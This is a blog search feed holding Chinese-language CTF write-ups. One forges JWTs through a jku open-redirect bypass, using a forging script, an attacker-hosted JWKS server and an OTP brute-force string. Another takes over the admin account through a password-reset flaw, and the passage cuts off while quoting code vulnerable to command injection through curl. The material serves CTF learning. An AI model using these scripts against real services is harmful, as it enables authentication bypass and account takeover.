<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>breaking_bad-writeup</title>
      <link href="/2024/12/18/breaking-bad-writeup/"/>
      <url>/2024/12/18/breaking-bad-writeup/</url>
      
        <content type="html"><![CDATA[<p>DIFFICULTY:<b>EASY</b><br>说实话这个简单纯属是因为出题人给太多提示了，其实这道题光是代码量就够喝一壶了<br>代码文件中&#x2F;&#x2F;TODO的部分都是提示，只要把wrapper.py填写完就可以了</p><h3><span id="step1-implement-create_forged_jwt">step1: implement create_forged_jwt</span></h3><p>下面这段代码的JWT验证支持jku，也就是从一个url去拿jwk，只不过限定只能以<a href="http://127.0.0.1:1337/%E5%BC%80%E5%A4%B4%EF%BC%8C%E4%BD%86%E6%98%AF/api/analytics/redirect%E8%B7%AF%E7%94%B1%E6%94%AF%E6%8C%81open">http://127.0.0.1:1337/开头，但是/api/analytics/redirect路由支持open</a> redirect<br>就能直接绕过，让axios重定向到我们的服务器</p><figure class="highlight js"><figcaption><span>challenge/server/middleware/jwksMiddleware.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">verifyToken</span> = <span class="keyword">async</span> (<span class="params">token</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> decodedHeader = jwt.<span class="title function_">decode</span>(token, &#123; <span class="attr">complete</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!decodedHeader || !decodedHeader.<span class="property">header</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid token: Missing header&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123; kid, jku &#125; = decodedHeader.<span class="property">header</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!jku) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid token: Missing header jku&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> is this secure enough?</span></span><br><span class="line">        <span class="keyword">if</span> (!jku.<span class="title function_">startsWith</span>(<span class="string">&#x27;http://127.0.0.1:1337/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid token: jku claim does not start with http://127.0.0.1:1337/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!kid) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid token: Missing header kid&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kid !== <span class="variable constant_">KEY_ID</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid token: kid does not match the expected key ID&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jwks;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(jku);</span><br><span class="line">            <span class="keyword">if</span> (response.<span class="property">status</span> !== <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Failed to fetch JWKS: HTTP <span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            jwks = response.<span class="property">data</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Error fetching JWKS from jku: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!jwks || !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(jwks.<span class="property">keys</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid JWKS: Expected keys array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> jwk = jwks.<span class="property">keys</span>.<span class="title function_">find</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> key.<span class="property">kid</span> === kid);</span><br><span class="line">        <span class="keyword">if</span> (!jwk) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid token: kid not found in JWKS&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jwk.<span class="property">alg</span> !== <span class="string">&#x27;RS256&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid key algorithm: Expected RS256&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!jwk.<span class="property">n</span> || !jwk.<span class="property">e</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid JWK: Missing modulus (n) or exponent (e)&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> publicKey = <span class="title function_">jwkToPem</span>(jwk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, publicKey, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;RS256&#x27;</span>] &#125;);</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Token verification failed: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">throw</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务器返回jwk的格式应该是json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span>                      </span><br><span class="line">        <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5cf5a00e-b3ff-4937-91a0-d25d2822084c&quot;</span><span class="punctuation">,</span>          <span class="comment">//改成一个有效的  </span></span><br><span class="line">        <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span>                     </span><br><span class="line">        <span class="attr">&quot;use&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sig&quot;</span><span class="punctuation">,</span>                      </span><br><span class="line">        <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;q4cmLGtQvMFpoV5gLzTjldo0yRqIxSbosHYu6cAGV19StWndRQ80xI8ZsP3J8TyxGFxKn19ha+Vtpm4Sxryr3w==&quot;</span><span class="punctuation">,</span>         </span><br><span class="line">        <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span>           </span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>注册一个账号，拿到账号的authorization头，bearer 后面的base64解码提取一个kid就可以了</p><p>然后还得生成一个有效的jwt签名，这个我们离线生成好然后记下来，之后放在authorization头里面，可以一直用，服务器没有检查jwt验证后用户是谁，也就是验证<br>通过后可以登录任何用户,rsa的密钥对我们自己生成一对（可以用我生成的，无需修改），我们的服务器返回的是base64编码十六进制值后的n和e，htb服务器会用这<br>两个验证我们的authorization头</p><p>给出我的脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_forged_jwt</span>(<span class="params">jku_url,payload</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">from</span> jwt <span class="keyword">import</span> encode</span><br><span class="line">    <span class="keyword">from</span> jwt <span class="keyword">import</span> decode</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives.serialization <span class="keyword">import</span> load_der_private_key</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line">    <span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    random.seed(<span class="number">42</span>)</span><br><span class="line">    n=<span class="number">0xab87262c6b50bcc169a15e602f34e395da34c91a88c526e8b0762ee9c006575f52b569dd450f34c48f19b0fdc9f13cb1185c4a9f5f616be56da66e12c6bcabdf</span></span><br><span class="line">    e=<span class="number">0x10001</span></span><br><span class="line">    d=<span class="number">0x20de1ed47823da677d642c7f65cc4ea7d24e3712dc8e5aac4fd3f59d58ec5e25579467783239f16db728e782258b8c22e3c7074cd75c8276ca82562cd294ddd1</span></span><br><span class="line">    p=<span class="number">0xd4f82fe5149161f8a01de650497673390dd1dd98034a6fc953080c62769cae0b</span></span><br><span class="line">    q=<span class="number">0xce2f67751e0f6c4e440f443c2333c54d26eb3c10ce1926331431d5f187e7e1fd</span></span><br><span class="line">    dmp1 = d % (p - <span class="number">1</span>)</span><br><span class="line">    dmq1 = d % (q - <span class="number">1</span>)</span><br><span class="line">    iqmp = <span class="built_in">pow</span>(q, -<span class="number">1</span>, p) </span><br><span class="line">    public_numbers = rsa.RSAPublicNumbers(e, n)</span><br><span class="line">    public_key = public_numbers.public_key()</span><br><span class="line">    public_key_pem = public_key.public_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    private_numbers = rsa.RSAPrivateNumbers(</span><br><span class="line">        p=p,  <span class="comment"># p and q are not needed in this case</span></span><br><span class="line">        q=q,</span><br><span class="line">        d=d,</span><br><span class="line">        dmp1=dmp1,</span><br><span class="line">        dmq1=dmq1,</span><br><span class="line">        iqmp=iqmp,</span><br><span class="line">        public_numbers=public_numbers,</span><br><span class="line">    )</span><br><span class="line">    private_key=private_numbers.private_key()</span><br><span class="line">    private_key_pem = private_key.private_bytes(</span><br><span class="line">        encoding=serialization.Encoding.PEM,</span><br><span class="line">        <span class="built_in">format</span>=serialization.PrivateFormat.PKCS8,</span><br><span class="line">        encryption_algorithm=serialization.NoEncryption()  <span class="comment"># 不加密</span></span><br><span class="line">    )</span><br><span class="line">    private_key_pem_str = private_key_pem.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    payload = payload</span><br><span class="line">    proxy=jku_url+<span class="string">&quot;/&quot;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;5cf5a00e-b3ff-4937-91a0-d25d2822084c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jku&quot;</span>: <span class="string">f&quot;http://127.0.0.1:1337/api/analytics/redirect?url=<span class="subst">&#123;proxy&#125;</span>key&amp;ref=aaa&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    sig = encode(payload, private_key_pem_str, algorithm=<span class="string">&quot;RS256&quot;</span>, headers=headers)</span><br><span class="line">    decoded = decode(sig, public_key_pem, algorithms=[<span class="string">&quot;RS256&quot;</span>])</span><br><span class="line">    auth=sig</span><br><span class="line">    <span class="keyword">return</span> auth</span><br><span class="line">    <span class="comment"># return token</span></span><br></pre></td></tr></table></figure><p>下面是我做题用的服务器脚本，不管你用什么把服务器搞到公网一定要保证连通性(没vps可以用frp)</p><figure class="highlight python"><figcaption><span>server.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_from_directory, abort,render_template_string,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_jwks</span>():</span><br><span class="line">    <span class="comment"># 1. 生成 RSA 密钥对</span></span><br><span class="line">    private_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">512</span></span><br><span class="line">    )</span><br><span class="line">    public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 提取公钥的模数 (n) 和指数 (e)</span></span><br><span class="line">    public_numbers = public_key.public_numbers()</span><br><span class="line">    n = public_numbers.n.to_bytes((public_numbers.n.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    e = public_numbers.e.to_bytes((public_numbers.e.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(private_key.private_numbers().d)</span><br><span class="line">    jwk = &#123;</span><br><span class="line">        <span class="string">&quot;kty&quot;</span>: <span class="string">&quot;RSA&quot;</span>,                      </span><br><span class="line">        <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;5cf5a00e-b3ff-4937-91a0-d25d2822084c&quot;</span>,            </span><br><span class="line">        <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,                   </span><br><span class="line">        <span class="string">&quot;use&quot;</span>: <span class="string">&quot;sig&quot;</span>,                     </span><br><span class="line">        <span class="string">&quot;n&quot;</span>: <span class="string">&quot;q4cmLGtQvMFpoV5gLzTjldo0yRqIxSbosHYu6cAGV19StWndRQ80xI8ZsP3J8TyxGFxKn19ha+Vtpm4Sxryr3w==&quot;</span>,         </span><br><span class="line">        <span class="string">&quot;e&quot;</span>: <span class="string">&quot;AQAB&quot;</span>            </span><br><span class="line">    &#125;</span><br><span class="line">    jwks = &#123;</span><br><span class="line">        <span class="string">&quot;keys&quot;</span>: [jwk]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> json.dumps(jwks, indent=<span class="number">4</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">CURRENT_DIR = os.getcwd()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    <span class="keyword">return</span> generate_jwks(),<span class="number">200</span>,&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行应用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">1234</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="step2爆破otp">step2:爆破otp</span></h3><p>如题，wrapper.py现在只缺otp参数，这个参数实际是一个1000-10000的密码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">setHash</span>(<span class="string">`otp:<span class="subst">$&#123;userId&#125;</span>`</span>, &#123; otp, <span class="attr">expiresAt</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>() + ttl * <span class="number">1000</span> &#125;);</span><br></pre></td></tr></table></figure><p>一分钟更新一次，但是验证却是用下面的逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Is this secure enough?</span></span><br><span class="line">    <span class="keyword">if</span> (!otp.<span class="title function_">includes</span>(validOtp)) &#123;</span><br><span class="line">      reply.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid OTP.&#x27;</span> &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>包含otp就可以，所以我们弄一个字符串包含所有1000-10000的字符串就可以了，要让字符串尽可能短就要最大化字符前缀的利用率，这好像是个算法题….<br>开玩笑的，字符串长度其实没限制，暴力枚举所有字符串就好</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1000</span>; i &lt;= <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    s += i;  </span><br><span class="line">&#125;</span><br><span class="line">s = s.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> x = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (<span class="number">10000</span> - <span class="number">1000</span> + <span class="number">1</span>)) + <span class="number">1000</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="title function_">includes</span>(x));  <span class="comment">// 输出 true</span></span><br></pre></td></tr></table></figure><p>记录下来然后在wrapper.py中添加otp&#x3D;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx就好</p><p>完整的代码(包括源代码)：<a href="/files/university-CTF/breaking_bad.zip">点我</a></p>]]></content>
      
      
      <categories>
          
          <category> university-CTF-2024 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Armaxis-writeup</title>
      <link href="/2024/12/17/Armaxis-writeup/"/>
      <url>/2024/12/17/Armaxis-writeup/</url>
      
        <content type="html"><![CDATA[<p>DIFFICULTY:<b>VERY EASY</b><br>step1:逻辑漏洞：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/reset-password&quot;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; token, newPassword, email &#125; = req.<span class="property">body</span>; <span class="comment">// Added &#x27;email&#x27; parameter</span></span><br><span class="line">  <span class="keyword">if</span> (!token || !newPassword || !email)</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Token, email, and new password are required.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> reset = <span class="keyword">await</span> <span class="title function_">getPasswordReset</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (!reset) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid or expired token.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> <span class="title function_">getUserByEmail</span>(email);</span><br><span class="line">    <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;User not found.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">updateUserPassword</span>(user.<span class="property">id</span>, newPassword);</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">deletePasswordReset</span>(token);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;Password reset successful.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error resetting password:&quot;</span>, err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Error resetting password.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>先用<a href="mailto:&#116;&#x65;&#x73;&#116;&#x40;&#x65;&#109;&#97;&#105;&#x6c;&#x2e;&#104;&#116;&#x62;">&#116;&#x65;&#x73;&#116;&#x40;&#x65;&#109;&#97;&#105;&#x6c;&#x2e;&#104;&#116;&#x62;</a>注册用户<br>然后重置test用户，在邮箱中拿到token，之后可用这个token重置admin用户的密码，然后登录为admin,可用burp或者python，也可以直接fetch:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host=<span class="string">&quot;http://83.136.255.197:34108/&quot;</span></span><br><span class="line">r=requests.post(host+<span class="string">&quot;reset-password&quot;</span>,json=&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;f1d0ac7d7c3ae334a2f03c0f386be845&quot;</span>,<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@armaxis.htb&quot;</span>,<span class="string">&quot;newPassword&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>step2:<br>os command injection</p><figure class="highlight js"><figcaption><span>markdown.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseMarkdown</span>(<span class="params">content</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!content) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> md.<span class="title function_">render</span>(</span><br><span class="line">        content.<span class="title function_">replace</span>(<span class="regexp">/\!\[.*?\]\((.*?)\)/g</span>, <span class="function">(<span class="params">match, url</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> fileContent = <span class="title function_">execSync</span>(<span class="string">`curl -s <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">const</span> base64Content = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(fileContent).<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">`&lt;img src=&quot;data:image/*;base64,<span class="subst">$&#123;base64Content&#125;</span>&quot; alt=&quot;Embedded Image&quot;&gt;`</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error fetching image from URL <span class="subst">$&#123;url&#125;</span>:`</span>, err.<span class="property">message</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">`&lt;p&gt;Error loading image: <span class="subst">$&#123;url&#125;</span>&lt;/p&gt;`</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span 